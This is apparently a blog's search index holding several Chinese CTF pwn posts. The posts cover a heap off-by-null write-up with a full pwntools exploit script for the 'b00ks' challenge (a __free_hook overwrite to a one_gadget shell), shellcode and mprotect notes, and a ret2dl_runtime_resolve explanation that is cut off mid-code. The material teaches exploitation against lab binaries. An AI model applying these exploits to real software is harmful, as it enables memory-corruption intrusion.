<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>堆上的off-by-null</title>
      <link href="/2019/09/24/%E5%A0%86%E4%B8%8A%E7%9A%84off-by-null/"/>
      <url>/2019/09/24/%E5%A0%86%E4%B8%8A%E7%9A%84off-by-null/</url>
      
        <content type="html"><![CDATA[<h2><span id="写在前面">写在前面</span></h2><blockquote><p>经典off-by-one的利用，而且是只有单字节null溢出。配合edit和show获得任意地址读写的能力，有趣的一点是在不用free的情况下就可以leak libc。这种题patch free就没有意义啦<br><a id="more"></a></p></blockquote><h2><span id="漏洞点">漏洞点</span></h2><p>my_read函数没有处理好边界，可以溢出一个null字节。首先pointer array填满之后，被分配到第一个chunkptr覆盖。导致show author的时候就可以leak heap了。接着通过凑布局的方法，再次溢出author name可以把array[0]的最低字节改成null，想办法让它指向array[0]的description。而只要在这之前给array[0]的description里通过leak的heap地址伪造好fake struct，通过show和edit就可以任意地址读写一次。如果让description指向其他的stuct_description_ptr,修改1的description就可以修改其他的description_ptr，那么真正做到多次任意地址读写。<strong>但是程序开了PIE,并且不能改got,必须leak libc</strong>，而分配和释放堆的顺序又让leak出一个libc地址很难。一个有趣的trick:<strong>因为没有约束description的size，可以分配一个超大的（大于132k的chunk），这样就会调用mmap分配地址，而这个地址和libc的偏移是固定的，而且这个地址会记录在struct中，struct地址又可以算出来。通过任意地址读写就能leaklibc了。</strong></p><h2><span id="exp">exp</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line">libc = ELF(<span class="string">'libc.so.6'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    io = process(<span class="string">'b00ks'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># io = remote('')</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(name, description, description_size)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    io.sendline(<span class="string">'1'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'size: '</span>)</span><br><span class="line">    io.sendline(str(len(name)))</span><br><span class="line">    io.recvuntil(<span class="string">'chars): '</span>)</span><br><span class="line">    io.sendline(name)</span><br><span class="line">    io.recvuntil(<span class="string">'size: '</span>)</span><br><span class="line">    io.sendline(str(description_size))</span><br><span class="line">    io.recvuntil(<span class="string">'description: '</span>)</span><br><span class="line">    io.sendline(description)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printall</span><span class="params">()</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    io.sendline(<span class="string">'4'</span>)</span><br><span class="line">    <span class="keyword">return</span> io.recvuntil(<span class="string">'Author: '</span>)+io.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    io.sendline(<span class="string">'2'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'delete: '</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(id, content)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    io.sendline(<span class="string">'3'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'edit: '</span>)</span><br><span class="line">    io.sendline(str(id))</span><br><span class="line">    io.recvuntil(<span class="string">'description: '</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_author</span><span class="params">(name)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    io.sendline(<span class="string">'5'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'name: '</span>)</span><br><span class="line">    io.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方便gdb debug，输入偏移地址就好</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DEBUG</span><span class="params">(bps = [], mems = [])</span>:</span></span><br><span class="line">    cmd = <span class="string">"set follow-fork-mode parent\n"</span></span><br><span class="line">    base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(io.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>) </span><br><span class="line">    cmd += <span class="string">''</span>.join([<span class="string">'b *&#123;:#x&#125;\n'</span>.format(b + base) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">    cmd += <span class="string">''</span>.join([<span class="string">'x/10gx &#123;:#x&#125;\n'</span>.format(m+base) <span class="keyword">for</span> m <span class="keyword">in</span> mems])</span><br><span class="line">    cmd += <span class="string">""</span></span><br><span class="line">    raw_input(<span class="string">"DEBUG: "</span>)</span><br><span class="line">    gdb.attach(io, cmd)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用off by null泄露堆地址</span></span><br><span class="line">io.recvuntil(<span class="string">'name: '</span>)</span><br><span class="line">io.sendline(<span class="string">'a'</span>*<span class="number">32</span>)</span><br><span class="line">create(<span class="string">"a"</span>*<span class="number">0x80</span>, <span class="string">"b"</span>*<span class="number">0x30</span>, <span class="number">0x30</span>)</span><br><span class="line"><span class="comment"># print(hex(u64((printall()[-7:-1]).ljust(8,'\x00'))))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 用mmap分配一个块，这个地址会记录在bookstruct的descript_ptr里，和libc有offset的固定偏移</span></span><br><span class="line">first_book_struct = u64((printall()[<span class="number">-7</span>:<span class="number">-1</span>]).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">first_book_description = first_book_struct - <span class="number">0x40</span></span><br><span class="line">create(<span class="string">"c"</span>*<span class="number">8</span>, <span class="string">'test'</span>, <span class="number">1320000</span>)</span><br><span class="line">offset = <span class="number">0x4ca010</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 往struct1的description里写上一个fake struct，伪造struct的descptr可以任意地址读写</span></span><br><span class="line"><span class="comment"># 读struct2的descript_ptr减去固定偏移可以泄露libcbase</span></span><br><span class="line"><span class="comment"># 最后写malloc_hook即可</span></span><br><span class="line">second_book_desc_ptr = first_book_struct + <span class="number">0x30</span> + <span class="number">0x20</span> + <span class="number">0x10</span></span><br><span class="line">fake_struct = p64(<span class="number">1</span>)+p64(second_book_desc_ptr)+p64(second_book_desc_ptr)+p32(<span class="number">0x30</span>)</span><br><span class="line">change(<span class="number">1</span>, fake_struct)</span><br><span class="line">print(hex(second_book_desc_ptr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用off by one修改bss段的array数组的第一个指针低位，指向fake struct</span></span><br><span class="line">change_author(<span class="string">'a'</span>*<span class="number">31</span>+<span class="string">'\x00'</span>*<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">io.sendline(<span class="string">'4'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'Description: '</span>)</span><br><span class="line">libcbase = u64((io.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>]).ljust(<span class="number">8</span>,<span class="string">'\0'</span>)) - offset</span><br><span class="line">malloc_hook = libcbase + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">onegadget = libcbase + <span class="number">0x4f322</span> <span class="comment"># 0x4f322</span></span><br><span class="line"><span class="comment"># print(hex(libcbase))</span></span><br><span class="line"><span class="comment">#struct       &lt;-- array[0]</span></span><br><span class="line"><span class="comment"># &#123;</span></span><br><span class="line"><span class="comment"># id          &lt;-- array[1]</span></span><br><span class="line"><span class="comment"># name                 |</span></span><br><span class="line"><span class="comment"># description ----------</span></span><br><span class="line"><span class="comment"># size</span></span><br><span class="line"><span class="comment"># &#125;</span></span><br><span class="line"><span class="comment"># array[s2_description_ptr,s2_struct_ptr]</span></span><br><span class="line"><span class="comment"># struct2's description ptr == malloc_hook</span></span><br><span class="line">change(<span class="number">1</span>, p64(malloc_hook))</span><br><span class="line"><span class="comment"># DEBUG([0xA89], [0x202040, 0x202060])</span></span><br><span class="line">change(<span class="number">2</span>, p64(onegadget))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> heap </tag>
            
            <tag> off-by-one </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windows IDA key-patch</title>
      <link href="/2019/08/12/%E8%A3%85IDA-Key-Patch/"/>
      <url>/2019/08/12/%E8%A3%85IDA-Key-Patch/</url>
      
        <content type="html"><![CDATA[<h2><span id="写在前面">写在前面</span></h2><ul><li>这个插件安装写不清楚。首先把python27-x64添加到PATH里，然后去下载python64版本的keystone, 安装的时候记得选择要把python27-x64作为安装对象。然后把keypatch.py丢到plugins目录下，必须是py文件。windows默认竟然不显示文件后缀~（插件作者不写好installation真心浪费用户时间。。）</li><li>还是比较好用的，angr要hook的时候可以用这个看指令长度。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> ida </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>最近的事情</title>
      <link href="/2019/08/08/%E6%9C%80%E8%BF%91%E7%9A%84%E4%BA%8B/"/>
      <url>/2019/08/08/%E6%9C%80%E8%BF%91%E7%9A%84%E4%BA%8B/</url>
      
        <content type="html"><![CDATA[<h2><span id="写在前面">写在前面</span></h2><blockquote><p>重新开更，接下来一年又是高强度的学习啦。暑假大概还有个1个月，开学又有课得上了，时间不会这么自由。在MSRA的一年主要目的是学好RL和ML。本来是一个主要更新pwn的blog，但是重开一个有没有必要。接下来主要记录的是AI+Binary吧。有些东西用slides记也还算方便，有的东西就是想写成blog。（PS:其实pwn好久没看以前会的技巧现在都忘光了~当初没有把blindpwn和ret2csu写下来，现在那叫一个后悔鸭）</p></blockquote><a id="more"></a><h2><span id="reinforcement-learning">Reinforcement Learning</span></h2><ul><li>Introduction to Reinforcement Learning</li><li>Paper Reading</li></ul><h2><span id="machine-learning">Machine Learning</span></h2><ul><li>统计学习方法</li><li>NNDL &amp; 西瓜书</li></ul><h2><span id="system-security">System Security</span></h2><ul><li>IDA Python 自动化</li><li>Angr or Panda</li><li>gdb &amp; reverse</li><li>llvm</li><li>程序员的自我修养</li><li>Linux C 编程</li><li>Paper Reading</li></ul><h2><span id="ctf">CTF</span></h2><ul><li>crypto &amp; sage</li><li>pwn skill</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> study </tag>
            
            <tag> plan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>荒废已久的pwn复习总结</title>
      <link href="/2019/05/29/%E8%8D%92%E5%BA%9F%E5%B7%B2%E4%B9%85%E7%9A%84pwn%E5%A4%8D%E4%B9%A0%E6%80%BB%E7%BB%93/"/>
      <url>/2019/05/29/%E8%8D%92%E5%BA%9F%E5%B7%B2%E4%B9%85%E7%9A%84pwn%E5%A4%8D%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h2><span id="写在前面">写在前面</span></h2><blockquote><p>天哪感觉有一个世纪没有写过blog的样子，曾经高产似母猪。 竟然一个多月没动笔了（雾。。） 好吧其实这个月做了好多事情，ctf打的比较少了所以就没怎么写blog了。（其实就是没长进hhh）做了一些别的事情，作品赛、学会掉机器学习的包玩玩nlp、疯狂尝试希望自己不要退学、 复习期末考试、 各种大作业。今天闲下来半夜写篇短的， 主要目的还是记录一下断断续续的一些知识点，然后过几天去国赛也得记得准备点素材。</p></blockquote><a id="more"></a><h2><span id="奇妙的shellcode">奇妙的shellcode</span></h2><p>shellcode确实是一个奇妙的东西，不需要libc的情况下getshell的一个方法。绕过NX呢需要这两种条件，mprotect函数存在或者mmap存在，调用参数如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mmap</span><span class="params">( <span class="keyword">void</span> *start , <span class="keyword">size_t</span> length , <span class="keyword">int</span> prot , <span class="keyword">int</span> flags , <span class="keyword">int</span> fd , <span class="keyword">off_t</span> offsize)</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mprotect</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *start, <span class="keyword">size_t</span> len, <span class="keyword">int</span> prot)</span></span>;</span><br></pre></td></tr></table></figure></p><p>开始地址，长度不用说，prot–&gt;protect表示设置访问权限（粒度和linux的访问控制一样，完了被计算机安全污染了rwx是7）. 要注意的是地址需要和0x1000对齐. mmap多三个参数，其中flags选择MAP_ANONYMOUS加MAP_PRIVATE，其中：</p><ul><li>MAP_ANONYMOUS：建立匿名映像。此时会忽略参数fd，不涉及文件，而且映像区域无法和其他进程共享。</li><li>MAP_PRIVATE：对映像区域的写入操作会产生一个映像文件的复制，即私人的“写入时复制”（copy on write）对此区域作的任何修改都不会写回原来的文件内容。当共享的对象的虚拟存储区域为私有对象时，修改只会被本进程中改变。<br><img src="/assets/img/mmap-flags.jpg" alt="flags-paras"><br>好啦，32位和64位一样，都是rop挑一个地方改权限，然后写shellcode。32位的话因为栈传参导致需要pop_2,pop_3之类的gadgets，从csu那里找就行（好吧我是不是没记录csu，改天写一个，不如就写在下面？）</li></ul><h2><span id="好用的welpwn和ida2pwntools">好用的welpwn和ida2pwntools</span></h2><ul><li>先说ida2pwntools, 这玩意贼好用，<code>from pwnlib.utils.proc import wait_for_debugger</code>之后直接f12可以弹出来。不过我可能得开始熟悉pwndbg了，毕竟更加灵活。（heapviewer真的太好用了啊！ida用得好其实问题并不大。。个人感觉）</li><li>welpwn的话，我觉得理念很好，常用工具就应该写一块重复造轮子干嘛！one_gadget, rop, libc_search就应该放一起呀，顺便提一下还有调libc顺便学习堆。pwn就应该变成art！所以自己也在下意识的积累自己的template，可以搞一波开发，顺便看看别人咋写的</li></ul><h2><span id="changld">changld</span></h2><p>妈妈再也不用担心libc不兼容！（其实还是担心，毕竟可能没有ld。。解决方案的话，我觉得多准备几个版本的虚拟机，啊明天就准备！）</p><p>(好困呀，改天写怎么blind pwn 和 怎么 ret2csu. 晚安世界！)</p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ret2dl_runtime_resolve</title>
      <link href="/2019/05/03/ret2dl-runtime-resolve/"/>
      <url>/2019/05/03/ret2dl-runtime-resolve/</url>
      
        <content type="html"><![CDATA[<h2><span id="写在前面">写在前面</span></h2><blockquote><p>是一个比较套路的技巧了，但是好好学一下也是应该的，不能只会用模版</p></blockquote><a id="more"></a><h2><span id="原理">原理</span></h2><p>动态链接下第一次调用glibc的函数需要通过plt表中的一段代码解析函数的真实地址，这也是linux的lazy bind的特点。具体的解析方式就是_dl_runtime_resolve(link_map_obj, reloc_arg) ，如果我们可以控制整个解析过程中的参数，那么就能解析我们想要的函数地址。<br>在整个动态链接的过程中需要的信息有:</p><h3><span id="重定位表relplt和reldyn">重定位表(.rel.plt和.rel.dyn)</span></h3><p><strong>.rel.dyn 包含了需要重定位的变量的信息, 叫做变量重定位表</strong><br><strong>.rel.plt 包含了需要重定位的函数的信息， 叫做函数重定位表</strong><br>具体的，函数重定位表表项为地址解析函数提供r_info的前24位，定位需要解析的函数；当程序代码引用一个重定位项的重定位类型或者符号表索引时，这个索引是对表项的 r_info 成员应用 ELF32_R_TYPE 或者 ELF32_R_SYM 的结果。 也就是说 r_info 的高三个字节对应的值表示这个动态符号在. dynsym 符号表中的位置<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_R_SYM(i)    ((i)&gt;&gt;8)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_R_TYPE(i)   ((unsigned char)(i))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_R_INFO(s,t) (((s)&lt;&lt;8)+(unsigned char)(t))</span></span><br></pre></td></tr></table></figure></p><p>函数重定位表表项为重定位入口提供一个偏移地址(r_offset)，定位函数地址的保存位置。这个偏移就是函数的got地址(.got.plt)。重定位表的定义如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">Elf32_Addrr_offset;<span class="comment">/* Address */</span></span><br><span class="line">Elf32_Wordr_info;<span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">&#125; Elf32_Rel;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">Elf64_Addrr_offset;<span class="comment">/* Address */</span></span><br><span class="line">Elf64_Xwordr_info;<span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">Elf64_Sxwordr_addend;<span class="comment">/* Addend */</span></span><br><span class="line">&#125; Elf64_Rela;</span><br></pre></td></tr></table></figure></p><p>Elf32_Rela 类型的表项包含明确的补齐信息, 一般来说，32 位程序只使用 Elf32_Rel，64 位程序只使用 Elf32_Rela</p><h3><span id="全局偏移表got和gotplt">全局偏移表(.got和.got.plt)</span></h3><p>GOT 表在 ELF 文件中分为两个部分</p><ul><li>.got，存储全局变量的引用。</li><li>.got.plt，存储函数的引用<br>在 Linux 的实现中，.got.plt 的前三项的具体的含义如下</li><li>GOT[0]，.dynamic 的地址。</li><li>GOT[1]，指向内部类型为 link_map 的指针，只会在动态装载器中使用，包含了进行符号解析需要的当前 ELF 对象的信息。每个 link_map 都是一条双向链表的一个节点，而这个链表保存了所有加载的 ELF 对象的信息。</li><li>GOT[2]，指向动态装载器中 _dl_runtime_resolve 函数<br>之后的got表项存的是函数的真实地址(解析过后)，解析前存的是对应plt表项中那段胶水代码的第二条指令地址。整个解析过程就是在各自的plt传递reloc_arg, 在plt0传递link_map_obj.接着调用_dl_runtime_resolve.要注意的是，32位的reloc_arg和64位的有区别：32位使用reloc_offset, 64位使用reloc_index<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> reloc_offset</span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">define</span> reloc_offset reloc_arg</span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">define</span> reloc_index  reloc_arg / sizeof (PLTREL)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure></li></ul><p><img src="/assets/img/dl_resolve/lazy-plt.png" alt="lazy-bind"></p><h3><span id="动态链接符号表dynsym">动态链接符号表(.dynsym)</span></h3><p>是一个结构体数组，结构体为Elf32_Sym:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word    st_name;   <span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  Elf32_Addr    st_value;  <span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf32_Word    st_size;   <span class="comment">/* Symbol size */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info;   <span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other;  <span class="comment">/* Symbol visibility under glibc&gt;=2.2 */</span></span><br><span class="line">  Elf32_Section st_shndx;  <span class="comment">/* Section index */</span></span><br><span class="line">&#125; Elf32_Sym;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Wordst_name;<span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span>st_info;<span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other;<span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf64_Sectionst_shndx;<span class="comment">/* Section index */</span></span><br><span class="line">  Elf64_Addrst_value;<span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf64_Xwordst_size;<span class="comment">/* Symbol size */</span></span><br><span class="line">&#125; Elf64_Sym;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_R_SYM(val)((val) &gt;&gt; 8)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_R_TYPE(val)((val) &amp; 0xff)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_R_INFO(sym, type)(((sym) &lt;&lt; 8) + ((type) &amp; 0xff))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_R_SYM(i)((i) &gt;&gt; 32)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_R_TYPE(i)((i) &amp; 0xffffffff)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_R_INFO(sym,type)((((Elf64_Xword) (sym)) &lt;&lt; 32) + (type))</span></span><br></pre></td></tr></table></figure></p><p>我们主要关注动态符号中的两个成员(<strong>注意32位和64位中这两个值在结构体里的位置不一样！</strong>)</p><ul><li><strong>st_name</strong>， 该成员保存着动态符号在 .dynstr 表（动态字符串表）中的偏移。</li><li><strong>st_value</strong>，如果这个符号被导出，这个符号保存着对应的虚拟地址。</li></ul><h3><span id="dl_runtime_resolve">dl_runtime_resolve</span></h3><p>32位的代码在这，重点在调用了dl_fixup来解析函数地址：(这里的JMPREL即.rel.plt, reloc_index即reloc_arg)</p><ul><li>根据 reloc_index 计算相应的重定位表项：Elf32_Rel *reloc = JMPREL + reloc_index</li><li>根据得到的重定位表项的 r_info 得到对应的符号在符号表中的索引：(reloc-&gt;r_info)&gt;&gt;8</li><li>继而得到对应的符号：Elf32_Sym *sym = &amp;SYMTAB[((reloc-&gt;r_info)&gt;&gt;8)]</li><li>判断符号的类型是否为 R_386_JMP_SLOT：assert (((reloc-&gt;r_info)&amp;0xff) == 0x7 )</li><li>if ((ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) == 0)</li><li>if (sym-&gt;st_other) &amp; 3 == 0 )<br>判断该符号是否已经解析过了，如果解析过，就不会再去执行 lookup 操作。得到符号的版本，如果 ndx 为 0 的话，会直接使用 local symbol。</li><li>uint16_t ndx = VERSYM[(reloc-&gt;r_info) &gt;&gt; 8]</li><li>r_found_version *version = &amp;l-&gt;l_version[ndx]</li><li>根据 name 来寻找相应函数在库中的地址。 name = STRTAB + sym-&gt;st_name</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">DL_FIXUP_VALUE_TYPE</span><br><span class="line">attribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE</span><br><span class="line">_dl_fixup (</span><br><span class="line"># ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS</span><br><span class="line">   ELF_MACHINE_RUNTIME_FIXUP_ARGS,</span><br><span class="line"># endif</span><br><span class="line">   struct link_map *l, ElfW(Word) reloc_arg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// 分别获取动态链接符号表和动态链接字符串表的基址</span></span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *<span class="keyword">const</span> symtab</span></span><br><span 